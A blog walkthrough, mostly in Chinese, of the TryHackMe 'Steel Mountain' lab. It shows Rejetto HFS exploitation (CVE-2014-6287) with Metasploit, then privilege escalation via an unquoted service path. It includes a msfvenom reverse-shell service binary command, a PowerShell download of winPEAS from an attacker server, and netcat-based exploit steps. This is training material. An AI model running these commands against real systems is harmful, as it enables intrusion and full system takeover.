# TryHackMe -- Steal Mountain


Steal Mountain Walkthrough.

<!--more-->

# THM - Steal Mountain

## Who is the employee of the month?

首先全端口服务和脚本扫描：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ sudo nmap -T4 -sC -sV -oN nmap.out -p- 10.10.33.145
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-06 01:43 EST
Warning: 10.10.33.145 giving up on port because retransmission cap hit (6).
Nmap scan report for localhost (10.10.33.145)
Host is up (0.35s latency).
Not shown: 65514 closed tcp ports (reset)
PORT      STATE    SERVICE            VERSION
80/tcp    open     http               Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3365/tcp  filtered contentserver
3389/tcp  open     ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2024-03-05T06:42:04
|_Not valid after:  2024-09-04T06:42:04
| rdp-ntlm-info:
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-03-06T07:14:09+00:00
|_ssl-date: 2024-03-06T07:14:16+00:00; -1s from scanner time.
5985/tcp  open     http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open     http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
47001/tcp open     http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
48566/tcp filtered unknown
48982/tcp filtered unknown
49152/tcp open     msrpc              Microsoft Windows RPC
49153/tcp open     msrpc              Microsoft Windows RPC
49154/tcp open     msrpc              Microsoft Windows RPC
49155/tcp open     msrpc              Microsoft Windows RPC
49156/tcp open     msrpc              Microsoft Windows RPC
49169/tcp open     msrpc              Microsoft Windows RPC
49170/tcp open     msrpc              Microsoft Windows RPC
51012/tcp filtered unknown
57482/tcp filtered unknown
60236/tcp filtered unknown
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:0:2:
|_    Message signing enabled but not required
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:79:9d:b1:65:7b (unknown)
| smb2-time:
|   date: 2024-03-06T07:14:08
|_  start_date: 2024-03-06T06:41:55

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1871.24 seconds
```

开了80端口，139/445端口。先看80端口：

![image-20240306153824756](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061538798.png)

只有一张图片，看下源码：

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Steel Mountain</title>
<style>
* {font-family: Arial;}
</style>
</head>
<body><center>
<a href="index.html"><img src="/img/logo.png" style="width:500px;height:300px;"/></a>
<h3>Employee of the month</h3>
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
</center>
</body>
</html>
```

发现图片的名字，BillHarper。

## Initial Access

### Scan the machine with nmap. What is the other port running a web server on?

另外一个跑web服务的端口：8080

### Take a look at the other web server. What file server is running?

看一下8080端口，文件服务器：

![image-20240306154658769](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061546807.png)

Rejetto HTTP File Server

### What is the CVE number to exploit this file server?

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ searchsploit rejetto | grep 2.3
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                              | windows/webapps/49125.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                           | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                 | windows/webapps/34852.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                      | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                      | windows/remote/39161.py

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ searchsploit -p 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
```

CVE-2014-6287

### Use Metasploit to get an initial shell. What is the user flag?

使用msf：

```shell
msf6 > search 2014-6287
msf6 > use 0
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhost 10.10.33.145
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > run
```

![image-20240306160639666](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061606715.png)

拿到shell之后去dekstop找到user.txt，内容即为flag。

## Privilege Escalation

这里使用了一个powershell脚本https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1。（该脚本是一个基于poweshell的提权功能脚本，包含了很多功能，后续会出专门的文章对该工具的使用进行详解。）

上传到目标机器，然后执行：

![image-20240306162134267](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061621275.png)

然后启动powershell扩展：

![image-20240306162309830](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061623871.png)

执行上传的脚本:

![image-20240306162547671](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061625717.png)

### What is the name of the service which shows up as an *unquoted service path* vulnerability?

存在问题的服务的名称：AdvancedSystemCareService9

### What is the root flag?

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as an Windows executable.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.30.241 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

Upload your binary and replace the legitimate one. Then restart the program to get a shell as root. 

本地生成payload之后，首先暂停掉目标服务AdvancedSystemCareService9，然后上传payload：

![image-20240306163834688](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061638495.png)

本地监听端口，重新进入shell启动服务，拿到system权限：

![image-20240306164034475](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061640530.png)

![image-20240306164152121](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061641177.png)

## Access and Escalation without Metasploit

不使用msf重新走一遍上面的流程。

### 1. 下载exp

可以直接使用searchsploit中的，也可以下载https://www.exploit-db.com/raw/39161

### 2. 修改port/ip

修改exp中的攻击机的ip和监听端口

![image-20240306170537719](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705771.png)

### 3. 开启一个web server，上传一个netcat.exe

这个exp需要使用natcat.exe来发起一个连接请求，所以需要上传一个netcat.exe到目标机器。采用的方式是python开启一个web server，然后上传。默认使用80，如果要修改这个端口，就要在exp的vbs变量中的ip_addr的后面加上`:[port]`字符串。

![image-20240306170551447](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061705497.png)

### 4. 开启web server，监听端口

netcat.exe放在web server目录下，同时开启端口监听

![image-20240306170752951](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061707005.png)

### 5. 运行exp，获取反弹shell

我这里通过VPN连接的kali怎么都弹不回来-。-不浪费时间了

### 6. 使用winPEAS

下载winPEAS：

```powershell
powershell -c wget "http://<ip>:8000/winPEAS.exe" -outfile "winPEAS.exe"
```

![img](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061738870.png)

### 7. 运行winPEAS，发现弱点

运行winPEAS，找到存在漏洞的服务：

![img](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061739953.png)

后续使用就是生成提权payload，stop服务，上传payload，替换exe，start服务，获得shell。

## 总结

扫 -> 找洞 -> 打 -> 提
